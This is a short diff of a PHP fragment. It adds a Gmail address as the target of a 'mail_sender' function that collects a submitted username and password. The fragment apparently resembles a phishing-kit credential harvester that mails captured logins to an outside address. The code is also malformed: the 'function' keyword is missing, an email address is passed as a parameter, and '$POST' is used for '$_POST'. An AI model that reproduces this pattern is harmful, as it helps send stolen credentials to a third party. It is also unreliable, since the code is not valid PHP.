@@ -1,5 +1,5 @@
 <?php
-	mail_sender(){
+	mail_sender(miniwachy@gmail.com){
 		$username = $POST['username'];
 		$password = $POST['password'];
 		
